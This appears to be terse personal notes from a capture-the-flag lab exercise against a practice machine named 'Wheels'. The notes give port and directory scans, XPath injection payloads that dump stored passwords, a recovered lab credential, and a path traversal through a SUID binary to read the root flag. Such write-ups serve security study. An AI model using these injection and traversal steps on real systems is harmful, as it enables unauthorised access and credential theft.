---
tags: [ProvingGround]
---

Wheels 5/29/25

------------------------------------

## 1. sudo nmap -p- -sC -sV -Pn -n --open 192.168.189.202 -oN nmap/initial
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Wheels - Car Repair Services
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## 2. gobuster dir -u http://192.168.189.202 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,bak,zip,conf,log,inc -t 50

/assets               (Status: 301) [Size: 319] [--> http://192.168.189.202/assets/]
/config.php           (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 316] [--> http://192.168.189.202/css/]
/img                  (Status: 301) [Size: 316] [--> http://192.168.189.202/img/]
/index.html           (Status: 200) [Size: 37054]
/index.html           (Status: 200) [Size: 37054]
/js                   (Status: 301) [Size: 315] [--> http://192.168.189.202/js/]
/lib                  (Status: 301) [Size: 316] [--> http://192.168.189.202/lib/]
/login.php            (Status: 200) [Size: 7937]
/portal.php           (Status: 302) [Size: 0] [--> login.php]
/register.php         (Status: 200) [Size: 8172]
/server-status        (Status: 403) [Size: 280]

## 3. It is possible to register a user using the @wheels.service domain and be able to login and access the http://192.168.189.202/portal.php (employee portal)
## 4. Found xpath injection vulnerability in http://192.168.189.202/portal.php?work='&action=search. In the work parameter.
https://tcm-sec.com/understanding-xpath-injection-a-beginners-guide/?source=post_page-----2afd23a1fb65---------------------------------------
## 5. This input work=')] | //users/*[contains(*,'. Return data 1-6.
## 6. This input work=')] | //*[contains(*,'.  Return names as well.
## 7. This input work=')] | //* | a[('. Returns all data including passwords.
## 8. Bob/Iamrockinginmyroom1212
## 9. Bob is not root.
## 10. find / -perm -u=s -type f 2>/dev/null
/opt/get-list
## 11. When running /opt/get-list if you pass ../../../../../../root/proof.txt #employees